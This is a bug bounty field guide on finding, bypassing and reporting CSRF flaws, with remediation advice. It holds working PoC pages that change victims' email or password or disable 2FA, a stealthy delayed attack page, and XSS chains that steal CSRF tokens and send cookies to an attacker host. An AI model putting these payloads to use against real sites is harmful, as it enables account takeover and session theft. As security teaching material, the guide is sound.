# 🔐 CSRF Hunter — Complete Field Guide

**By Cyberwarlord (Deepak Ghengat)**  
*100+ accepted reports · Hall of Fame: Google · Zoho · TripAdvisor · Adafruit*

> **Authorised testing only. Always have written permission before testing any target.**

---

## Table of Contents

1. [What Is CSRF and Why It Matters](#1-what-is-csrf)
2. [How CSRF Protection Works — And How It Fails](#2-how-protection-works)
3. [Finding CSRF Vulnerabilities — Methodology](#3-methodology)
4. [CSRF Bypass Techniques](#4-bypass-techniques)
5. [Proof of Concept Templates](#5-poc-templates)
6. [SameSite Cookie Bypass](#6-samesite-bypass)
7. [CSRF via XSS — Maximum Impact](#7-csrf-via-xss)
8. [Toolchain and Automation](#8-tools)
9. [Writing the Report](#9-report)
10. [Real Bug Bounty Examples](#10-real-examples)

---

## 1. What Is CSRF

Cross-Site Request Forgery forces an authenticated victim's browser to send an unintended request to a target application. The application processes the request because it arrives with the victim's valid session cookies — it cannot distinguish a legitimate user action from a forged one.

### The Attack in One Line

```
Victim visits attacker's page → attacker's page sends request to target.com → 
target.com sees valid session cookie → executes action as victim
```

### Why CSRF Is High Severity When It Hits the Right Endpoint

```
CSRF on password change endpoint     → Account takeover
CSRF on email change endpoint        → Account takeover  
CSRF on admin user creation          → Privilege escalation
CSRF on fund transfer endpoint       → Financial loss
CSRF on API key regeneration         → Service disruption
CSRF on account deletion             → Denial of service to user
CSRF on 2FA disable endpoint         → Security downgrade
CSRF on payment/checkout endpoint    → Fraudulent transactions
```

Impact is everything. CSRF on a "change display theme" endpoint is informational. CSRF on a password reset endpoint is Critical.

---

## 2. How CSRF Protection Works — And How It Fails

### 2.1 The CSRF Token — Standard Defence

The most common protection. The server generates a random, unpredictable token tied to the user's session. The token is embedded in forms and must be included in state-changing requests. An attacker cannot read the token from a different origin — so they cannot forge the request.

```html
<!-- Protected form -->
<form action="/account/change-email" method="POST">
  <input type="hidden" name="csrf_token" value="a3f8c2d9e1b4...">
  <input type="email" name="email" value="">
  <button type="submit">Change Email</button>
</form>
```

**How this fails:**

```
❌ Token is predictable or sequential
❌ Token is not validated server-side (accepted without check)
❌ Token is accepted from any parameter name (not just expected one)
❌ Token is reusable indefinitely (never expires)
❌ Token from one user accepted for another user's request
❌ Validation only checks token exists, not that it matches
❌ GET requests perform state-changing actions (no token in GET)
❌ Token included in URL (leaks via Referer header)
```

### 2.2 SameSite Cookies

Modern browsers support the `SameSite` cookie attribute:

```
SameSite=Strict  — Cookie never sent on cross-site requests
SameSite=Lax     — Cookie sent on top-level navigation only (default in modern browsers)
SameSite=None    — Cookie always sent (requires Secure flag)
```

**Why this is not the end of CSRF:**

```
❌ SameSite=Lax allows cookies on GET requests with navigation
❌ Subdomain attacks bypass SameSite in some configurations
❌ Old browsers do not support SameSite
❌ Misconfigured SameSite=None;Secure still vulnerable
❌ Same-site window.open() attacks bypass Lax in some cases
```

### 2.3 Referer / Origin Header Validation

Some applications check the `Referer` or `Origin` header to verify the request came from the expected domain.

**How this fails:**

```
❌ Referer header can be suppressed (meta referrer policy)
❌ Origin header not always sent (some browsers, some contexts)
❌ Validation checks if header CONTAINS the domain (not equals)
   → attacker.com?trusted.com  passes the contains check
❌ Validation skips check if header is absent (missing ≠ rejected)
❌ Subdomain not validated: sub.attacker.com passes trusted.com check
```

---

## 3. Methodology — Finding CSRF

### 3.1 Identify State-Changing Endpoints

CSRF only matters on actions that change state. Read-only endpoints are not vulnerable. Focus your effort:

```
HIGH VALUE (always test):
POST /account/change-password
POST /account/change-email
POST /account/settings/2fa/disable
POST /admin/users/create
POST /admin/users/delete
POST /payments/transfer
POST /api/keys/regenerate
POST /account/delete

MEDIUM VALUE (test if token absent):
POST /profile/update
POST /notifications/settings
POST /integrations/connect
POST /webhooks/create

LOW VALUE (usually not worth reporting):
POST /preferences/theme
POST /ui/settings/layout
GET requests (read-only)
```

### 3.2 Step-by-Step Testing Process

**Step 1: Intercept a legitimate request in Burp Suite**

Perform the action as a normal user. Capture the full HTTP request.

**Step 2: Look for the CSRF token**

```
WHERE TOKENS APPEAR:
- Hidden form field:        <input name="csrf_token" value="...">
- Request header:           X-CSRF-Token: abc123
- Cookie + header pair:     Cookie: csrf=abc; Header: X-CSRF: abc
- JSON body field:          {"csrf":"abc123","email":"new@email.com"}
- URL parameter:            /action?csrf=abc123&email=new@email.com
```

**Step 3: Test token validation**

```
Test A — Remove the token entirely
  → Send request without any csrf_token parameter
  → If accepted: VULNERABLE

Test B — Send an empty token
  → csrf_token=
  → If accepted: VULNERABLE

Test C — Send a random token
  → csrf_token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
  → If accepted: VULNERABLE

Test D — Use a valid token from a different session
  → Log in as User B, get their token, use it in User A's request
  → If accepted: VULNERABLE (tokens not session-bound)

Test E — Change request method
  → If POST is protected, try GET /action?email=attacker@x.com
  → If accepted: VULNERABLE

Test F — Change Content-Type
  → Try application/json instead of application/x-www-form-urlencoded
  → Some CSRF protections only trigger on specific content types
```

**Step 4: Check Referer/Origin validation**

```
Test G — Remove Referer header
  → If accepted: May be vulnerable (no Referer validation)

Test H — Spoof Referer
  → Referer: https://trusted.com.attacker.com/
  → Referer: https://attacker.com/?https://trusted.com/
  → If accepted: VULNERABLE (contains check not equals check)
```

### 3.3 Checklist

```
FOR EVERY STATE-CHANGING ENDPOINT:
[ ] Is there a CSRF token in the request?
[ ] Is the token validated if removed?
[ ] Is the token validated if set to empty?
[ ] Is the token validated if set to random value?
[ ] Is the token session-specific (not shared across sessions)?
[ ] Does changing request method to GET bypass the check?
[ ] Does changing Content-Type to multipart bypass the check?
[ ] Does the application rely solely on Referer validation?
[ ] Can Referer validation be bypassed with subdomain prefix?
[ ] Is SameSite cookie attribute set and what value?
[ ] Does the action work via cross-origin fetch or form submit?
```

---

## 4. CSRF Bypass Techniques

### 4.1 Token Removal

The simplest test. Many developers validate the token only if present — if absent, the check is skipped.

```
Original:  POST /change-email
Body:      email=victim@old.com&csrf_token=a3f8c2d9e1b4

Test:      POST /change-email  
Body:      email=attacker@evil.com
```

### 4.2 Method Switching

If POST is protected, try the same action via GET:

```
Original:  POST /api/user/delete
           Body: user_id=123&csrf_token=abc

Test:      GET /api/user/delete?user_id=123
```

### 4.3 Content-Type Switching

CSRF protections are sometimes only triggered by `application/x-www-form-urlencoded`. Switching to `text/plain` or `multipart/form-data` can bypass the check while still delivering the payload.

```
Original:
  POST /api/settings
  Content-Type: application/x-www-form-urlencoded
  Body: email=attacker@evil.com&csrf_token=abc

Bypass attempt 1:
  Content-Type: text/plain
  Body: email=attacker@evil.com&csrf_token=abc

Bypass attempt 2:
  Content-Type: multipart/form-data; boundary=----xyz
  ------xyz
  Content-Disposition: form-data; name="email"
  attacker@evil.com
  ------xyz--
```

### 4.4 JSON CSRF

When an endpoint accepts JSON, browsers cannot send `Content-Type: application/json` cross-origin without a preflight request. However:

```javascript
// Bypass 1: text/plain with JSON body (no preflight required)
fetch('https://target.com/api/settings', {
  method: 'POST',
  mode: 'no-cors',
  headers: {'Content-Type': 'text/plain'},
  body: '{"email":"attacker@evil.com"}'
})
// Works if server accepts JSON regardless of Content-Type header

// Bypass 2: form enctype with JSON-like structure
// <form enctype="text/plain" method="POST" action="https://target.com/api/settings">
// <input name='{"email":"attacker@evil.com","padding":"' value='"}'>
// Sends: {"email":"attacker@evil.com","padding":"="}  — may parse as valid JSON
```

### 4.5 Referer Header Bypass

```
Technique 1: Suppress Referer with meta tag
  <meta name="referrer" content="no-referrer">
  → Request sent with no Referer header
  → If server skips validation when header absent: BYPASS

Technique 2: Subdomain prefix trick
  Host the PoC at: https://trusted.com.attacker.com/csrf.html
  → Referer: https://trusted.com.attacker.com/csrf.html
  → If server checks contains("trusted.com"): BYPASS

Technique 3: URL path trick
  Host the PoC page at: https://attacker.com/trusted.com/csrf.html
  → Referer: https://attacker.com/trusted.com/csrf.html
  → If server checks contains("trusted.com"): BYPASS
```

### 4.6 Token Reuse and Fixation

```
# Test 1: Token from old session still valid after logout
  1. Log in, collect CSRF token
  2. Log out
  3. Log back in
  4. Use old CSRF token in request
  → If accepted: VULNERABLE (tokens not invalidated on logout)

# Test 2: Token not tied to specific action
  1. Collect CSRF token from password-change form
  2. Use same token to submit email-change request
  → If accepted: VULNERABLE (token not action-specific)
```

### 4.7 CORS Misconfiguration → CSRF

If the target has a CORS misconfiguration that reflects the Origin header:

```javascript
// If Access-Control-Allow-Origin: * or reflects attacker.com
// with Access-Control-Allow-Credentials: true

fetch('https://target.com/api/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': ''  // May read token from CORS response first
  },
  body: JSON.stringify({email: 'attacker@evil.com'})
})
```

---

## 5. Proof of Concept Templates

### 5.1 Standard HTML Form PoC

```html
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
  <h1>You have been CSRF'd</h1>
  <form id="csrf-form" action="https://TARGET.COM/account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <!-- Remove or keep the token field depending on your test -->
    <!-- <input type="hidden" name="csrf_token" value="removed"> -->
  </form>
  <script>
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
```

### 5.2 Silent Background Fetch PoC

```html
<!DOCTYPE html>
<html>
<body>
  <script>
    // No user interaction required — fires on page load
    fetch('https://TARGET.COM/account/change-email', {
      method: 'POST',
      mode: 'no-cors',    // Required for cross-origin POST
      credentials: 'include',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'email=attacker%40evil.com'
    })
    .then(() => console.log('CSRF fired'))
    .catch(err => console.log('Error:', err));
  </script>
</body>
</html>
```

### 5.3 Multipart/Form-Data PoC

```html
<!DOCTYPE html>
<html>
<body>
  <form id="f" action="https://TARGET.COM/account/update" 
        method="POST" enctype="multipart/form-data">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="username" value="pwned">
  </form>
  <script>document.getElementById('f').submit();</script>
</body>
</html>
```

### 5.4 JSON CSRF via text/plain

```html
<!DOCTYPE html>
<html>
<body>
  <form id="f" action="https://TARGET.COM/api/user/update"
        method="POST" enctype="text/plain">
    <!-- name + value = key:value when sent as text/plain -->
    <input type="hidden" name='{"email":"attacker@evil.com","x":"' value='"}'>
  </form>
  <script>document.getElementById('f').submit();</script>
</body>
</html>
<!-- Sends body: {"email":"attacker@evil.com","x":"="} -->
<!-- Server may parse this as valid JSON -->
```

### 5.5 GET-Based CSRF (One-Liner)

```html
<!-- If the vulnerable action accepts GET requests -->
<img src="https://TARGET.COM/account/delete?confirm=true">
<img src="https://TARGET.COM/admin/users/promote?user_id=123&role=admin">
<iframe src="https://TARGET.COM/api/2fa/disable?token="></iframe>
```

### 5.6 Auto-Submit with Delay (Stealthier)

```html
<!DOCTYPE html>
<html>
<body>
  <!-- Looks like a normal page while attack runs in background -->
  <h1>Loading resources...</h1>
  <script>
    setTimeout(function() {
      var form = document.createElement('form');
      form.method = 'POST';
      form.action = 'https://TARGET.COM/account/change-password';
      form.style.display = 'none';
      
      var field1 = document.createElement('input');
      field1.name = 'new_password';
      field1.value = 'Attacker123!';
      form.appendChild(field1);
      
      var field2 = document.createElement('input');
      field2.name = 'confirm_password';
      field2.value = 'Attacker123!';
      form.appendChild(field2);
      
      document.body.appendChild(form);
      form.submit();
    }, 2000);
  </script>
</body>
</html>
```

---

## 6. SameSite Cookie Bypass

### 6.1 Understanding SameSite=Lax

`SameSite=Lax` (default in Chrome since 2020) sends cookies on cross-site requests only for **top-level GET navigations**. This blocks most CSRF attacks but has exploitable gaps.

### 6.2 Lax Bypass — GET Navigation

```html
<!-- SameSite=Lax allows cookies on top-level GET navigation -->
<!-- If the action can be triggered via GET: -->

<a href="https://TARGET.COM/account/change-email?email=attacker@evil.com">
  Click here for a prize
</a>

<!-- Or force navigation with window.location -->
<script>
  window.location = 'https://TARGET.COM/account/change-email?email=attacker@evil.com';
</script>
```

### 6.3 Lax Bypass — window.open()

```javascript
// Some browser versions send SameSite=Lax cookies on window.open()
// Depends on the browser and exact SameSite implementation

var win = window.open('https://TARGET.COM/account/change-email?email=attacker@evil.com');
// In some cases cookies are sent — test specifically
```

### 6.4 Subdomain Takeover + SameSite

If a subdomain of target.com is vulnerable to subdomain takeover:

```
1. Attacker takes over subdomain.target.com
2. Hosts CSRF PoC at https://subdomain.target.com/csrf.html
3. Requests from subdomain.target.com → target.com are SAME-SITE
4. SameSite=Strict and SameSite=Lax cookies are sent
5. CSRF protection bypassed entirely
```

### 6.5 Cookie Tossing Attack

If an application sets cookies on the parent domain from a subdomain:

```javascript
// From a XSS on subdomain.target.com or a taken-over subdomain
// Overwrite the CSRF cookie with a known value
document.cookie = 'csrf_token=known_value; domain=.target.com; path=/';

// Now forge the request with the known CSRF token value
// Application validates token against the (now controlled) cookie
```

---

## 7. CSRF via XSS — Maximum Impact

When XSS and CSRF are combined, you bypass both protections simultaneously. XSS executes same-origin JavaScript, which means it can read CSRF tokens and include them in forged requests.

### 7.1 Read CSRF Token via XSS Then Make Request

```javascript
// Step 1: Fetch the page containing the CSRF token
fetch('/account/settings', {credentials: 'include'})
  .then(response => response.text())
  .then(html => {
    // Step 2: Extract the CSRF token from the HTML
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    const token = doc.querySelector('input[name="csrf_token"]').value;
    
    // Step 3: Use the token to forge a state-changing request
    return fetch('/account/change-email', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-CSRF-Token': token
      },
      body: 'email=attacker@evil.com&csrf_token=' + encodeURIComponent(token)
    });
  })
  .then(() => {
    // Exfiltrate confirmation
    new Image().src = 'https://attacker.com/confirm?done=1';
  });
```

### 7.2 Full Account Takeover Chain

```javascript
// XSS fires on victim's browser → reads token → changes email →
// attacker triggers password reset to new email → full ATO

async function fullATO() {
  // 1. Read CSRF token
  const settingsPage = await fetch('/account/settings', {credentials: 'include'});
  const html = await settingsPage.text();
  const csrf = html.match(/name="csrf_token" value="([^"]+)"/)[1];
  
  // 2. Change email to attacker-controlled address
  await fetch('/account/change-email', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: `email=attacker@evil.com&csrf_token=${csrf}`
  });
  
  // 3. Exfiltrate session for immediate access
  new Image().src = 'https://attacker.com/?c=' + document.cookie;
}

fullATO();
```

### 7.3 CSRF Token in JS Variable

Sometimes the CSRF token is stored in a JavaScript variable rather than a hidden form field:

```javascript
// Look for patterns like this in page source:
// var csrfToken = "a3f8c2d9e1b4...";
// window.__csrf = "a3f8c2d9e1b4...";

// If XSS fires on same origin, access it directly:
const token = window.__csrf || window.csrfToken;
fetch('/account/change-password', {
  method: 'POST',
  credentials: 'include',
  headers: {'X-CSRF-Token': token},
  body: JSON.stringify({password: 'Attacker123!'})
});
```

---

## 8. Tools

### 8.1 Burp Suite — Primary Tool

```
CSRF Testing Workflow in Burp:

1. Proxy → HTTP History → find state-changing request
2. Right-click → "Engagement tools" → "Generate CSRF PoC"
3. Burp generates the HTML form automatically
4. Click "Test in browser" to confirm it fires
5. Manually modify to test bypass techniques

Built-in CSRF scanner (Burp Pro):
- Automatically identifies missing tokens
- Tests for common bypasses
- Flags SameSite misconfiguration
```

### 8.2 Manual Testing Commands

```bash
# Test token removal with curl
curl -X POST https://target.com/account/change-email \
  -H "Cookie: session=VICTIM_SESSION_COOKIE" \
  -d "email=attacker@evil.com" \
  -v

# Test method switch
curl -X GET "https://target.com/account/change-email?email=attacker@evil.com" \
  -H "Cookie: session=VICTIM_SESSION_COOKIE" \
  -v

# Test with Referer suppressed
curl -X POST https://target.com/account/change-email \
  -H "Cookie: session=VICTIM_SESSION_COOKIE" \
  -H "Referer:" \
  -d "email=attacker@evil.com&csrf_token=removed" \
  -v

# Test content-type switch
curl -X POST https://target.com/api/settings \
  -H "Cookie: session=VICTIM_SESSION_COOKIE" \
  -H "Content-Type: text/plain" \
  -d '{"email":"attacker@evil.com"}' \
  -v
```

### 8.3 CSRF PoC Generator (Python)

```python
#!/usr/bin/env python3
"""
Quick CSRF PoC generator from Burp-captured request
Usage: python3 csrf_poc.py request.txt
"""

import sys
import urllib.parse

def generate_poc(request_file):
    with open(request_file) as f:
        lines = f.read().split('\n')
    
    method = lines[0].split()[0]
    path = lines[0].split()[1]
    
    host = ''
    body = ''
    in_body = False
    
    for line in lines[1:]:
        if line.startswith('Host:'):
            host = line.split(': ')[1].strip()
        if line == '':
            in_body = True
            continue
        if in_body:
            body = line
    
    url = f'https://{host}{path}'
    params = urllib.parse.parse_qs(body)
    
    fields = '\n'.join([
        f'    <input type="hidden" name="{urllib.parse.unquote(k)}" '
        f'value="{urllib.parse.unquote(v[0])}">'
        for k, v in params.items()
        if 'csrf' not in k.lower()  # Remove CSRF token
    ])
    
    poc = f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC — Cyberwarlord</title></head>
<body>
  <form id="csrf" action="{url}" method="{method}">
{fields}
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>"""
    
    print(poc)
    with open('csrf_poc.html', 'w') as f:
        f.write(poc)
    print(f'\n[+] Saved to csrf_poc.html', file=sys.stderr)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Usage: python3 csrf_poc.py request.txt')
        sys.exit(1)
    generate_poc(sys.argv[1])
```

---

## 9. Writing the Report

### 9.1 Report Template

```markdown
## Summary
CSRF on the change-email endpoint allows an attacker to change the email address 
of any authenticated user without their knowledge, enabling full account takeover 
via password reset.

## Severity: High
CVSS: 8.8 — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N

## Vulnerable Endpoint
POST https://target.com/account/change-email

## Root Cause
The endpoint does not validate a CSRF token. Requests are processed based solely 
on session cookies, which are automatically included by the browser in cross-origin 
requests.

## Steps to Reproduce

1. Log in to target.com as victim@target.com
2. In a separate browser or tab, serve the following HTML:

   [paste PoC HTML here]

3. Visit the PoC page while logged in to target.com
4. Observe: email is changed to attacker@evil.com without any user action
5. Attacker triggers password reset to attacker@evil.com
6. Attacker accesses the victim's account

## Proof of Concept HTML

```html
<html>
<body>
  <form id="f" action="https://target.com/account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.getElementById('f').submit();</script>
</body>
</html>
```

## Impact
An attacker who can trick a logged-in victim into visiting a malicious page can:
- Change the victim's email address without authentication
- Trigger a password reset to the attacker-controlled email
- Gain complete access to the victim's account
- Access all data, payments, and connected services associated with the account

## Remediation
1. Implement synchronizer token pattern — generate a cryptographically random 
   per-session CSRF token, embed in all state-changing forms, validate on server
2. Set SameSite=Strict or SameSite=Lax on session cookies
3. Validate Origin and Referer headers as a secondary defence
4. Require re-authentication for sensitive operations like email change
```

### 9.2 Severity Decision Guide

```
CRITICAL — CSRF on:
  Password change (no current password required)
  Email change (no verification required)
  Admin user creation
  Fund transfer / payment
  2FA disable

HIGH — CSRF on:
  Profile information change
  API key regeneration  
  Account settings with security impact
  OAuth application authorization

MEDIUM — CSRF on:
  Non-sensitive data changes
  Notification preferences
  Connected account management

LOW / INFORMATIONAL — CSRF on:
  Read-only operations
  UI/display preferences
  Actions with no real-world impact
  Self-CSRF only (no victim required)
```

### 9.3 Common Rejection Reasons and Fixes

| Rejection | Why It Happens | Your Fix |
|-----------|---------------|----------|
| "Self-CSRF only" | Attacker and victim are same person | Show multi-user scenario — one account forges request on another |
| "Requires authentication" | Triage misunderstood | Clarify: victim is authenticated, attacker just needs them to visit a link |
| "Low impact endpoint" | Not enough impact shown | Show the full account takeover chain — email change → password reset |
| "SameSite prevents it" | Partial protection present | Test and show if SameSite bypass works, or document exactly what is blocked |
| "No real users would click" | PoC is implausible | Show a convincing social engineering scenario — embedded in email, LinkedIn |

---

## 10. Real Bug Bounty Examples

### Example 1 — CSRF on 2FA Disable (Critical)

**Target:** SaaS platform with 2FA  
**What I found:** The endpoint to disable two-factor authentication had no CSRF protection. No token. No SameSite cookie. Just the session cookie.

**Attack chain:**
1. Attacker hosts PoC on a convincing-looking page
2. Sends the link to the victim in a phishing email
3. Victim is logged in to the SaaS platform in another tab
4. Victim visits the attacker's link — 2FA is silently disabled
5. Attacker with stolen password can now log in without 2FA

**PoC:**
```html
<img src="https://target.com/account/2fa/disable?confirm=true">
```
The endpoint accepted GET requests. One line. Critical severity. Significant bounty.

**Lesson:** Check if sensitive security operations accept GET requests. Developers sometimes add CSRF protection to POST endpoints but forget the GET equivalent.

---

### Example 2 — Token Validation Skipped When Token Absent

**Target:** E-commerce platform  
**What I found:** The checkout endpoint included a CSRF token in the form. When I removed the token parameter entirely from the POST request, the server accepted it and processed the order.

**Root cause:** Server-side logic:
```python
# Vulnerable code (pseudocode)
if 'csrf_token' in request.POST:
    if request.POST['csrf_token'] != session['csrf_token']:
        return 403  # Token present but wrong
    # If token matches, continue
# No check if token is ABSENT — falls through to action
process_order(request)
```

**Fix:** The check should be: if token is absent OR does not match → reject.

**Lesson:** Token removal is always the first test. Many implementations check the token only when present.

---

### Example 3 — Referer Bypass with Subdomain Prefix

**Target:** Financial services web app  
**Defence:** Checked `Referer` header for `bank.com`  
**Bypass:** Registered domain `bank.com.attacker.com` and hosted the PoC there

```
Sent Referer: https://bank.com.attacker.com/csrf_poc.html
Server check: if 'bank.com' in referer → allow  ← VULNERABLE
```

**Lesson:** Referer validation using `contains` instead of exact domain match is bypassable with a registered subdomain-prefix domain.

---

### Example 4 — JSON CSRF via text/plain

**Target:** Modern REST API  
**What I found:** The API accepted JSON with no CSRF token. The developer assumed JSON APIs are CSRF-safe because browsers cannot send `Content-Type: application/json` cross-origin without a CORS preflight. But the server accepted `text/plain` content type for JSON bodies.

**PoC:**
```html
<form method="POST" action="https://api.target.com/user/update" 
      enctype="text/plain">
  <input name='{"email":"attacker@evil.com","_":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
```

**Body sent:** `{"email":"attacker@evil.com","_":"="}`  
**Server accepted** this as valid JSON and updated the email.

**Lesson:** JSON does not mean CSRF-safe. Test `text/plain` content type with JSON-structured body.

---

## Quick Reference

```
FIND IT:
  Map state-changing endpoints → intercept requests → look for CSRF token

TEST IT:
  Remove token → empty token → random token → method switch → content-type switch

BYPASS IT:
  Referer suppression → subdomain trick → JSON via text/plain → SameSite Lax GET

ESCALATE IT:
  Low impact action → High impact action (password/email change, admin creation)
  CSRF alone → CSRF + XSS = full account takeover

REPORT IT:
  Root cause → PoC HTML → full impact chain → CVSS score → remediation steps
```

---

## Remediation Reference

| Defence | Correct Implementation |
|---------|----------------------|
| CSRF Token | Random, per-session, validated server-side on every state-changing request — rejected if absent or mismatched |
| SameSite Cookie | `SameSite=Strict` for session cookies — `Lax` acceptable with additional token defence |
| Origin Validation | Check `Origin` header equals expected domain — reject if absent or unexpected |
| Referer Validation | Check `Referer` equals (not contains) expected domain — reject if absent |
| Re-authentication | Require current password for email/password changes as second factor |
| Double Submit Cookie | Cryptographically tied cookie+token pair — harder to forge than simple token |

---

*Cyberwarlord — Bug Bounty Hunter — Pune, India*  
*Specialisation: XSS · CSRF · IDOR · Business Logic*  
*Hall of Fame: Google · Zoho · TripAdvisor · Adafruit*
